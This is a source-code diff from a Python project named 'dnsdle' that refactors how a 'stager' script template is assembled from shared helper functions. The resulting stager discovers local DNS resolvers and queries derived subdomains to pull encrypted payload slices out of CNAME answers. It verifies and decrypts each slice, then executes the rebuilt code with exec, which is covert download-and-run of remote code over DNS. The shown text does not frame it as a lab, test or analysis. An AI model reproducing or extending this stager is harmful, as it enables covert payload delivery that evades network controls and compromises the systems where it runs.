@@ -1,36 +1,9 @@
 from __future__ import absolute_import, unicode_literals
 
-import os
-
-from dnsdle.state import StartupError
+from dnsdle.extract import extract_functions
 
 
-def _read_resolver_source(filename):
-    sentinel = "# __TEMPLATE_SOURCE__"
-    source_dir = os.path.dirname(os.path.abspath(__file__))
-    filepath = os.path.join(source_dir, filename)
-    try:
-        with open(filepath, "r") as handle:
-            content = handle.read()
-    except Exception as exc:
-        raise StartupError(
-            "startup",
-            "generator_invalid_contract",
-            "cannot read resolver source file: %s" % exc,
-            {"filename": filename},
-        )
-    idx = content.find(sentinel)
-    if idx < 0:
-        raise StartupError(
-            "startup",
-            "generator_invalid_contract",
-            "sentinel not found in resolver source file",
-            {"filename": filename},
-        )
-    return content[idx + len(sentinel):]
-
-
-_STAGER_PRE_RESOLVER = '''#!/usr/bin/env python
+_STAGER_HEADER = '''#!/usr/bin/env python
 # -*- coding: ascii -*-
 import base64
 import hashlib
@@ -64,74 +37,36 @@ PAYLOAD_COMPRESSED_SIZE = @@PAYLOAD_COMPRESSED_SIZE@@
 PAYLOAD_SHA256 = @@PAYLOAD_SHA256@@
 PAYLOAD_TOKEN_LEN = @@PAYLOAD_TOKEN_LEN@@
 
+try:
+    text_type = unicode
+    binary_type = str
+except NameError:
+    text_type = str
+    binary_type = bytes
 
-# Ensure ASCII bytes
-def _ab(v):
-    if isinstance(v, bytes):
-        return v
-    return v.encode("ascii")
+DnsParseError = ValueError
+DNS_POINTER_TAG = 0xC0
+PAYLOAD_ENC_KEY_LABEL = b"dnsdle-enc-v1|"
+PAYLOAD_ENC_STREAM_LABEL = b"dnsdle-enc-stream-v1|"
+PAYLOAD_MAC_KEY_LABEL = b"dnsdle-mac-v1|"
+PAYLOAD_MAC_MESSAGE_LABEL = b"dnsdle-mac-msg-v1|"
+PAYLOAD_MAC_TRUNC_LEN = 8
+MAPPING_SLICE_LABEL = b"dnsdle:slice:v1|"
+
+'''
 
 
-# Ensure UTF-8 bytes
-def _ub(v):
-    if isinstance(v, bytes):
-        return v
-    return v.encode("utf-8")
-
-
-# Integer to ASCII bytes
-def _ib(v):
-    return _ab(str(int(v)))
-
-
-# Derive slice token at runtime
-def _derive_slice_token(index):
-    msg = b"dnsdle:slice:v1|" + _ab(PUBLISH_VERSION) + b"|" + _ib(index)
-    dg = hmac.new(_ab(MAPPING_SEED), msg, hashlib.sha256).digest()
-    t = base64.b32encode(dg).decode("ascii").lower().rstrip("=")
-    return t[:SLICE_TOKEN_LEN]
-
+_STAGER_DNS_OPS = '''
 
 # Encode DNS name to wire format
 def _encode_name(labels):
     parts = []
     for label in labels:
-        raw = _ab(label)
+        raw = encode_ascii(label)
         parts.append(struct.pack("!B", len(raw)))
         parts.append(raw)
     parts.append(b"\\x00")
     return b"".join(parts)
-
-
-# Decode DNS name from wire format with pointer decompression
-def _decode_name(msg, off):
-    ba = bytearray(msg)
-    labels = []
-    jumped = False
-    end = None
-    visited = set()
-    while True:
-        first = ba[off]
-        if (first & 0xC0) == 0xC0:
-            ptr = ((first & 0x3F) << 8) | ba[off + 1]
-            if ptr in visited:
-                raise ValueError("loop", ptr)
-            visited.add(ptr)
-            if not jumped:
-                end = off + 2
-                jumped = True
-            off = ptr
-            continue
-        if first & 0xC0:
-            raise ValueError("ltype", first)
-        off += 1
-        if first == 0:
-            break
-        eo = off + first
-        label = "".join(chr(ba[j]) for j in range(off, eo)).lower()
-        labels.append(label)
-        off = eo
-    return tuple(labels), (end if jumped else off)
 
 
 # Build DNS query for QTYPE A with optional EDNS OPT record
@@ -191,101 +126,6 @@ def _extract_payload(cname_labels):
     return "".join(cname_labels[:-slen])
 
 
-# Base32 decode with no-padding lowercase alphabet
-def _b32d(text):
-    upper = text.upper()
-    pad = (8 - len(upper) % 8) % 8
-    return base64.b32decode(_ab(upper + "=" * pad))
-
-
-# Derive encryption key from PSK
-def _enc_key(pk):
-    msg = b"dnsdle-enc-v1|" + _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
-    return hmac.new(pk, msg, hashlib.sha256).digest()
-
-
-# Derive MAC key from PSK
-def _mac_key(pk):
-    msg = b"dnsdle-mac-v1|" + _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
-    return hmac.new(pk, msg, hashlib.sha256).digest()
-
-
-# Generate XOR keystream
-def _keystream(ek, si, length):
-    blocks = []
-    produced = 0
-    counter = 0
-    si_b = _ib(si)
-    fi_b = _ab(FILE_ID)
-    pv_b = _ab(PUBLISH_VERSION)
-    while produced < length:
-        cb = _ib(counter)
-        inp = b"dnsdle-enc-stream-v1|" + fi_b + b"|" + pv_b + b"|" + si_b + b"|" + cb
-        block = hmac.new(ek, inp, hashlib.sha256).digest()
-        blocks.append(block)
-        produced += len(block)
-        counter += 1
-    return b"".join(blocks)[:length]
-
-
-# XOR two equal-length byte strings
-def _xor(left, right):
-    la = bytearray(left)
-    ra = bytearray(right)
-    out = bytearray(len(la))
-    for i in range(len(la)):
-        out[i] = la[i] ^ ra[i]
-    return bytes(out)
-
-
-# Constant-time byte comparison
-def _secure_compare(left, right):
-    fn = getattr(hmac, "compare_digest", None)
-    if fn:
-        return fn(left, right)
-    la = bytearray(left)
-    ra = bytearray(right)
-    if len(la) != len(ra):
-        return False
-    r = 0
-    for i in range(len(la)):
-        r |= la[i] ^ ra[i]
-    return r == 0
-
-
-# Compute truncated MAC for a slice
-def _expected_mac(mk, si, ciphertext):
-    msg = b"dnsdle-mac-msg-v1|"
-    msg += _ab(FILE_ID) + b"|" + _ab(PUBLISH_VERSION)
-    msg += b"|" + _ib(si)
-    msg += b"|" + _ib(TOTAL_SLICES)
-    msg += b"|" + _ib(COMPRESSED_SIZE)
-    msg += b"|" + ciphertext
-    return hmac.new(mk, msg, hashlib.sha256).digest()[:8]
-
-
-# Parse binary record, verify MAC, decrypt slice
-def _process_slice(ek, mk, si, payload_text):
-    record = _b32d(payload_text)
-    ba = bytearray(record)
-    if ba[0] != 0x01:
-        raise ValueError("ver", ba[0])
-    if ba[1] != 0x00:
-        raise ValueError("rsvd", ba[1])
-    clen = struct.unpack("!H", record[2:4])[0]
-    if clen == 0:
-        raise ValueError("zero_ct")
-    if 4 + clen + 8 != len(record):
-        raise ValueError("rec_sz", len(record), 4 + clen + 8)
-    ciphertext = record[4:4 + clen]
-    mac = record[4 + clen:]
-    em = _expected_mac(mk, si, ciphertext)
-    if not _secure_compare(em, mac):
-        raise ValueError("mac", si)
-    stream = _keystream(ek, si, clen)
-    return _xor(ciphertext, stream)
-
-
 # Send DNS query over UDP and return response
 def _send_query(addr, pkt):
     _af = socket.AF_INET6 if ":" in addr[0] else socket.AF_INET
@@ -300,6 +140,37 @@ def _send_query(addr, pkt):
         except Exception:
             pass
     return resp
+
+
+# Parse binary record, verify MAC, decrypt slice
+def _process_slice(ek, mk, si, payload_text):
+    record = base32_decode_no_pad(payload_text)
+    ba = bytearray(record)
+    if ba[0] != 0x01:
+        raise ValueError("ver", ba[0])
+    if ba[1] != 0x00:
+        raise ValueError("rsvd", ba[1])
+    clen = struct.unpack("!H", record[2:4])[0]
+    if clen == 0:
+        raise ValueError("zero_ct")
+    if 4 + clen + 8 != len(record):
+        raise ValueError("rec_sz", len(record), 4 + clen + 8)
+    ciphertext = record[4:4 + clen]
+    mac = record[4 + clen:]
+    mac_msg = (
+        PAYLOAD_MAC_MESSAGE_LABEL
+        + encode_ascii(FILE_ID) + b"|"
+        + encode_ascii(PUBLISH_VERSION) + b"|"
+        + encode_ascii_int(si, "slice_index") + b"|"
+        + encode_ascii_int(TOTAL_SLICES, "total_slices") + b"|"
+        + encode_ascii_int(COMPRESSED_SIZE, "compressed_size") + b"|"
+        + ciphertext
+    )
+    em = hmac_sha256(mk, mac_msg)[:PAYLOAD_MAC_TRUNC_LEN]
+    if not constant_time_equals(em, mac):
+        raise ValueError("mac", si)
+    stream = _keystream_bytes(ek, FILE_ID, PUBLISH_VERSION, si, clen)
+    return _xor_bytes(ciphertext, stream)
 
 '''
 
@@ -361,9 +232,8 @@ else:
     addr = (host, port)
 if verbose:
     sys.stderr.write("resolver %s\\n" % repr(addr))
-pk = _ub(psk)
-ek = _enc_key(pk)
-mk = _mac_key(pk)
+ek = _derive_file_bound_key(psk, FILE_ID, PUBLISH_VERSION, PAYLOAD_ENC_KEY_LABEL)
+mk = _derive_file_bound_key(psk, FILE_ID, PUBLISH_VERSION, PAYLOAD_MAC_KEY_LABEL)
 _deadline = time.time() + 60
 slices = {}
 for si in range(TOTAL_SLICES):
@@ -371,7 +241,7 @@ for si in range(TOTAL_SLICES):
         if time.time() > _deadline:
             sys.exit(1)
         try:
-            qname = (_derive_slice_token(si), FILE_TAG) + tuple(DOMAIN_LABELS)
+            qname = (_derive_slice_token(encode_ascii(MAPPING_SEED), PUBLISH_VERSION, si, SLICE_TOKEN_LEN), FILE_TAG) + tuple(DOMAIN_LABELS)
             qid = random.randint(0, 0xFFFF)
             pkt = _build_query(qid, qname)
             resp = _send_query(addr, pkt)
@@ -415,6 +285,29 @@ exec(client_source)
 
 
 def build_stager_template():
-    windows_resolver = _read_resolver_source("resolver_windows.py")
-    linux_resolver = _read_resolver_source("resolver_linux.py")
-    return _STAGER_PRE_RESOLVER + windows_resolver + linux_resolver + _STAGER_DISCOVER + _STAGER_SUFFIX
+    encoding = extract_functions("compat.py", [
+        "encode_ascii", "encode_utf8", "decode_ascii", "encode_ascii_int",
+        "is_binary", "base32_lower_no_pad", "base32_decode_no_pad",
+        "constant_time_equals",
+    ])
+    crypto = extract_functions("helpers.py", [
+        "hmac_sha256", "_derive_slice_token",
+    ])
+    crypto += extract_functions("cname_payload.py", [
+        "_derive_file_bound_key", "_keystream_bytes", "_xor_bytes",
+    ])
+    dns = extract_functions("dnswire.py", ["_decode_name"])
+    resolvers = extract_functions("resolver_linux.py", [
+        "_load_unix_resolvers",
+    ])
+    resolvers += extract_functions("resolver_windows.py", [
+        "_run_nslookup", "_parse_nslookup_output", "_load_windows_resolvers",
+    ])
+    extracted = "\n\n".join(encoding + crypto + dns + resolvers)
+    return (
+        _STAGER_HEADER
+        + extracted + "\n"
+        + _STAGER_DNS_OPS
+        + _STAGER_DISCOVER
+        + _STAGER_SUFFIX
+    )
